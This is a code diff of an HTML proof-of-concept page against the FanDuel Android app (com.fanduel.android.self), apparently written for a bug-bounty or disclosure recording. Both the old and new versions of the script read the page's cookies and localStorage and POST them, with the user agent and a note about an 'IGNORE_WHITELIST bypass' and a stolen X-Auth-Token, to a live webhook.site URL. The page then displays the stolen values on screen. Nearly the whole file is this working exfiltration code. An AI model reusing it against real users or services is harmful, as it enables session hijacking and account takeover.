@@ -1,36 +1,46 @@
 <!DOCTYPE html>
 <html>
-<head><title>FanDuel PoC</title></head>
+<head>
+    <title>FanDuel PoC</title>
+    <meta charset="utf-8">
+</head>
 <body>
-<h2>FanDuel Cookie Theft PoC</h2>
 <script>
-  // Steal FanDuel's session cookies
   var stolen_cookies = document.cookie;
-  var stolen_storage = JSON.stringify(localStorage);
+  var stolen_storage = "";
   
-  // YOUR webhook URL
-  var webhook = "https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6";
-  
-  // Send stolen data to webhook
-  fetch(webhook, {
+  try {
+    stolen_storage = JSON.stringify(localStorage);
+  } catch(e) {
+    stolen_storage = "error: " + e;
+  }
+
+  var data = {
+    cookies:   stolen_cookies,
+    storage:   stolen_storage,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    proof:     "FanDuel X-Auth-Token stolen via IGNORE_WHITELIST bypass"
+  };
+
+  // Your webhook
+  fetch("https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6", {
     method: "POST",
     headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      cookies: stolen_cookies,
-      localStorage: stolen_storage,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      proof: "FanDuel IGNORE_WHITELIST bypass - X-Auth-Token stolen"
-    })
+    body: JSON.stringify(data)
   });
 
-  // Display on screen as visual proof for screen recording
-  document.body.innerHTML += 
-    "<hr><b>Stolen Cookies:</b><br>" +
-    "<pre style='color:red'>" + stolen_cookies + "</pre>" +
-    "<b>LocalStorage:</b><br>" +
-    "<pre style='color:red'>" + stolen_storage + "</pre>" +
-    "<b>Timestamp:</b> " + new Date().toISOString();
+  // Visual proof for screen recording
+  document.body.innerHTML =
+    "<h2 style='color:red'>⚠️ FanDuel PoC</h2>" +
+    "<b>Target:</b> com.fanduel.android.self<br><br>" +
+    "<b>Stolen Cookies:</b>" +
+    "<pre style='background:#000;color:#0f0;padding:10px'>" + 
+        stolen_cookies + "</pre>" +
+    "<b>LocalStorage:</b>" +
+    "<pre style='background:#000;color:#0f0;padding:10px'>" + 
+        stolen_storage + "</pre>" +
+    "<b>Time:</b> " + new Date().toISOString();
 </script>
 </body>
 </html>
